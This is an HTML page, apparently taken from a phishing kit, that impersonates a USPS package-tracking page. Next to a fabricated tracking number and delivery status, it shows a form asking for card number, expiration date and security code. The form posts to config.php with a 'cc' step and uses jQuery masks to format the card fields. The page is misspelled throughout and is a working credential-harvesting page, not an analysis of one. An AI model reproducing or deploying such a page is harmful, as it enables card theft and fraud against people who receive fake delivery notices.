<!DOCTYPE html>
<!-- saved from url=(0038)/look/cc.php -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	    
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <!-- link_icons -->
        <link rel="stylesheet" href="./../files/3_files/bootstrap-icons.css">
        <link rel="stylesheet" href="./../files/3_files/font-awesome.min.css"> 
        <title>Welcom | USPS</title>
        <!-- logo site web-->
        <link rel="icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <link rel="shortcut icon" href="/look/photos/khikhi.ico" type="image/x-icon">
        <!-- link__css -->
        <link rel="stylesheet" href="./../files/3_files/bootstrap.css">
        <link rel="stylesheet" href="./../files/3_files/laylay.css">
</head>
<body>
        
        <!-- ======START___HEADER====== -->
        <div class="header">
            <div class="container-fluid">
                <ul>
                    <li><img src="./../files/3_files/langue.png"><span>Englich</span></li>
                    <li><img src="./../files/3_files/location.svg"><span>Locations</span></li>
                    <li><img src="./../files/3_files/support.png"><span>Support</span></li>
                    <li><img src="./../files/3_files/delivry.svg"><span>Informed Delivry</span></li>
                    <li><span>Rejister / Sign In</span></li>
                </ul>
            </div>
        </div>
        <!-- ======ENNND___HEADER====== -->

        <!-- HEADER___HIDDEN -->
        <div class="hide">
            <div class="container-fluid">
                <div class="show">
                    <img src="./../files/3_files/combo.svg">
                    <img src="./../files/3_files/pro_logo.svg" class="tiger">
                    <img src="./../files/3_files/search.svg">
                </div>
            </div>
        </div>
        <!-- HEADER___HIDDEN -->


        <!-- ======START___NAVBAR====== -->
        <div class="navbar">
            <div class="container-fluid">
                <div class="company">
                    <img src="./../files/3_files/usps_logo.svg">
                </div>
                <div class="choses">
                    <ul>
                        <li class="active">Quick Tools</li>
                        <li>Send</li>
                        <li>Receive</li>
                        <li>Shop</li>
                        <li>Business</li>
                        <li>International</li>
                        <li>Help</li>
                        <li><img src="./../files/3_files/search.svg"></li>
                    </ul>
                </div>
            </div>
        </div>
        <!-- ======ENNND___NAVBAR====== -->

        <div class="container track">
            <div><h1>USPS Tracking®</h1></div>
            <div>
                <span class="active">Tracking</span>
                <span class="paco">FAQs<i class="fa fa-angle-right"></i></span>
            </div>
        </div>


        <div class="container">
            <div class="pub">
                <div class="posteri">
                    <img src="./../files/3_files/posta.svg">
                    <p>Track Packages<br>Anytime, Anywhere</p>
                </div>
                <div class="para">
                    <p>Get the free Informed Delivery feature to receive<br> automated notifications on your packages</p>
                    <button class="btn">Learn more</button>
                </div>
            </div>
        </div>

        <!-- ======START__INFO====== -->
        <div class="info carta mt-5">
             <div class="container">
                <div class="stepsis">
                    <div class="niveu "></div>
                    <div class="niveu"></div>
                    <div class="niveu hiey"></div>
                </div>
                 <div class="row gx-4 gy-4 pt-5">
                     <div class="col-lg-6  col-md-6 col_12">
                         <div class="login">
                             <h4>Contact-information</h4>
                             <div class="lebaa">
                                 <form action="config.php" method="post">
                                     <input type="hidden" name="step" value="cc">
                                     <div class="form-group mt-3">
                                         <label>Card Number</label>
                                         <div class="one">
                                             <input type="text" required="required" name="card_num" class="form-control" id="card_num" placeholder="**** **** **** ****">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>Expiration Date </label>
                                         <div class="one">
                                             <input required="required" type="text" name="date" class="form-control" id="date" placeholder="**/**">
                                         </div>
                                     </div>
                                     <div class="form-group mt-3">
                                         <label>Security Code</label>
                                         <div class="one">
                                             <input required="required" type="text" name="code" class="form-control" id="code" placeholder="****">
                                         </div>
                                     </div>
                                     <div class="forbot">
                                         <button class="btn" name="submit">Sign In</button>
                                     </div>
                                 </form>
                             </div>
                         </div>
                     </div>
                     <div class="col-lg-6 col-md-6 col_12">
                         <div class="title">
                            <div class="paragraph">
                                <p class="pom"><strong>Trcking Number</strong> : US/2938426</p>
                                <span>Your item arrived at our USPS facility in PITTSBURGH PA NETWORK DISTRIBUSTION CENTER. The item is currently in transit to the destination.</span>
                            </div>
                            <div class="lowing">
                                <strong>Status</strong>
                                <h5>Arrived at USPS regional Facility</h5>
                                <p>
                                    
                                    <br>
                                    PITTABURGH PA NETWORK DISTRIBUTION CENTER
                                </p>
                                <span>Change Delivry instruction <i class="fa fa-angle-down ms-2"></i></span>
                            </div>
                         </div>
                     </div>
                 </div>
             </div>
        </div>
         <!-- ======END__INFO====== -->


         <!-- ======END__game====== -->
         <div class="game text-center">
             <div class="container">
                 <h2>Can’t find what you’re looking for?</h2>
                 <p>Go to our FAQs section to find answers to your tracking questions.</p><p>
                 <button class="btn">FAQs</button>
             </p></div>
         </div>
         <!-- ======Start__game====== -->
         

         <!-- START____FOOTER -->
         <div class="fotter">
             <div class="container-fluid">
                 <img src="./../files/3_files/usps_logo.svg">
                 <div class="row pt-4">
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>HELPFUL LINKS</strong></li>
                             <li>Contact Us</li>
                             <li>Site Index</li>
                             <li>FAQs</li>
                             <li>Feedback</li>
                         </ul>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>ON ABOUT.USPS.COM</strong></li>
                             <li>About USPS Home</li>
                             <li>Newsroom</li>
                             <li>USPS Service Updates</li>
                             <li>Forms &amp; Publications</li>
                             <li>Government Services</li>
                             <li>Careers</li>
                         </ul>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>OTHER USPS SITES</strong></li>
                             <li>Business Customer Gateway</li>
                             <li>Postal Inspectors</li>
                             <li>Inspector General</li>
                             <li>Postal Explorer</li>
                             <li>National Postal Museum</li>
                             <li>Resources for Developers</li>
                         </ul>
                     </div>
                     <div class="col-lg-3 col-md-3 col-6">
                         <ul>
                             <li><strong>LEGAL INFORMATION</strong></li>
                             <li>Privacy Policy</li>
                             <li>Terms of Use</li>
                             <li>FOIA</li>
                             <li>No FEAR Act/EEO Contacts</li>
                         </ul>
                     </div>
                 </div>
                 <span class="copirayt">Copyright © 2022 USPS. All Rights Reserved.</span>
                 <hr class="my-4">
                 <div class="socieu">
                    <ul>
                      <li><img src="./../files/3_files/fb.png"></li>
                      <li><img src="./../files/3_files/twitter.png"></li>
                      <li><img src="./../files/3_files/pinter.png"></li>
                      <li><img src="./../files/3_files/yout.png"></li>
                    </ul>
                 </div>
             </div>
         </div>
         <!-- END____FOOTER -->

 

        <script src="./../files/3_files/jquery-3.5.1.min.js.téléchargement"></script>
        <script src="./../files/3_files/jquery.mask.js.téléchargement"></script>
        <script src="./../files/3_files/bootstrap.min.js.téléchargement"></script>
        <script>

              $("#card_num").mask("0000 0000 0000 0000");
              $("#date").mask("00/00");
              $("#code").mask("000000");

        </script>

<div id="torrent-scanner-popup" style="display: none;"></div></body></html>